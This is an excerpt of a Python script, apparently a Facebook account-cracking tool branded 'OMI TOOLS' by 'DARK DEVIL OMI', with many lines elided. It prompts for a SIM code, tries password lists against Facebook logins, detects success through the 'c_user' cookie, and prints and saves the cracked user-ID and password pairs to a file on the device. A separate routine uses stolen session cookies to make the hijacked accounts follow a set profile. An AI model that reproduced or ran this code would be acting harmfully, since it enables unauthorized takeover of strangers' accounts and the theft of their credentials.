...
def o():
    ...
    OMI =input("\033[1;92m[\033[1;34m➢]\033[1;92mCHOOSE : ")
    if OMI == '1':
    	C1()
    if OMI == '2':
        C2()
...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/kabsundisb?mibextid=ZbWKwL', {
...
os.system('clear')
print('\x1b[1;32m             DARK DEVIL CLONING START PLEASE WAIT  \033[1;95m● \033[1;95m● \033[1;91m● \033[1;92m● \033[1;93m●')
time.sleep(5)
os.system('clear')
...
$$    $$/ $$ | $/  $$ |/ $$   |
 $$$$$$/  $$/      $$/ $$$$$$/ 
\033[1;91m\033[1;41m\033[1;97m              WELCOME TO OMI TOOLS               \033[;0m\033[1;91m\033[1;92m

\033[1;92m══════════════════════════════════════════
\033[1;32m[-] TOOLS TYPE:\033[1;32m PREMIUM
\033[1;32m[-] VERSION   :\033[1;32m 3.0
\033[1;32m[-] AUTHOR    :\033[1;32m DARK DEVIL OMI 
\033[1;32m[-] GITHUB    :\033[1;32m OMI HASAN 
\033[1;32m[-] FACEBOOK  :\033[1;32m DARK DEVIL OM
\033[1;92m══════════════════════════════════════════
\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS OMI BRAND\033[;0m\033[1;91m═══>\033[1;92m"""
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;96m[\033[1;92m[OMI-OK💛]\033[1;96m[❤️]\033[1;92m' +uid+'\033[1;92m●'+ps+'\033[1;94m<=>'+tahunng(uid))
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print('\033[1;96m[OMI-CP]\033[1;93m[😪]\033[1;96m'+uid+'='+ps+'\033[1;93m<=>'+tahunng(uid))
                print ('\033[1;32m[‎🍁]\033[1;91m = \033[1;34m'+pro+'  \033[0;32m')
                ...
                continue
        sys.stdout.write('\r%s[OMI-%s/%s] \033[1;92m[OK-%s][CP-%s]\r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
...
def C3():
    ...
    os.system('clear')
    print(logo)
    kode = input(' \033[1;94m[♨️] ENTER SIM CODE: ')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print ('')
                print('\033[1;93m [\033[1;96mOMI-OK💚\033[1;93m]\033[1;91m = \033[1;96m\033[1;92m' +uid+' | '+ps+'\033[1;91m = \033[1;96m '+tahunng(uid))
              ...
              #  print ('\033[1;32m[‎🥂🍻🍾🍷]\033[1;91m = \033[1;34m'+coki+'  \033[0;32m')
                #cek_apk(session,coki)
                open('/sdcard/OMI-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
        ...
        sys.stdout.write('\r%s[OMI-KING💥]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
